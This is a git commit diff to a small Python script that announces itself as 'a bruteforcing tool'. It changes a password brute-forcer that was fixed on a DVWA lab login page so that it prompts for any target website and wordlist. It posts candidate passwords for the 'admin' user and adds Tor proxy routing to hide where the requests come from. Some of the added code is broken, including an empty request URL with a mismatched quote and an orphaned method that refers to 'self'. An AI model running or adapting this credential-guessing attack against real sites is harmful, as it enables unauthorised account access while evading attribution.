0b826b4c821131a64aa13837494dc38018925baf
aashish baweja <aashishbaweja03@gmail.com>
2019-07-30 22:29:09 +0530

    Update tool.py

--- tool.py
+++ tool.py
@@ -1,10 +1,21 @@
 import requests
+from pip._vendor.distlib.compat import raw_input
 
 
-target_url = "http://10.0.2.20/dvwa/login.php"
+
+print("this is a bruteforcing tool")
+
+target_url = raw_input("enter the target website for bruteforcing: ")
+
+
+#variable for storing the passwords
+password_list = raw_input("enter the path of the password list: ")
+
+
+
 #data dict for taking the values for the input function specifying for each parameter
 
-data_dict = {"username": "admin", "password": "password", "Login": "submit"}
+data_dict = {"username": "admin", "password": " ", "Login": "submit"}
 
 
 #sending the post requests to the target website
@@ -13,7 +24,7 @@ data_dict = {"username": "admin", "password": "password", "Login": "submit"}
 
 
 
-with open("/root/Downloads/password.list", "r") as wordlist:
+with open(password_list, "r") as wordlist:
     for line in wordlist:
         word = line.strip()
         data_dict["password"] = word
@@ -22,4 +33,30 @@ with open("/root/Downloads/password.list", "r") as wordlist:
             print("[+] Got the password -->" + word)
             exit()
 
+
 print("[+] Reached end of line")
+
+# proxies section and connection within tor network
+
+session = requests.session()
+session.proxies = {}
+session.proxies['http'] = 'socks5h://localhost:9050'
+session.proxies['https'] = 'socks5h://localhost:9050'
+
+
+r = session.get(‘')
+print(r.text)
+
+#function for checking tor is configured correctly
+def checkTor(self):
+		isConfigured = False
+		if self.useTor:
+			self.setupTOR()
+		if self.proxies:
+			try:
+				response = requests.get('https://check.torproject.org/',headers=self.getSpoofedHeaders(),proxies=self.proxies)
+				if self.CHECK_TOR_REGEX.search(response.text):
+					isConfigured = True
+			except Exception as e:
+				print(e)
+		return isConfigured
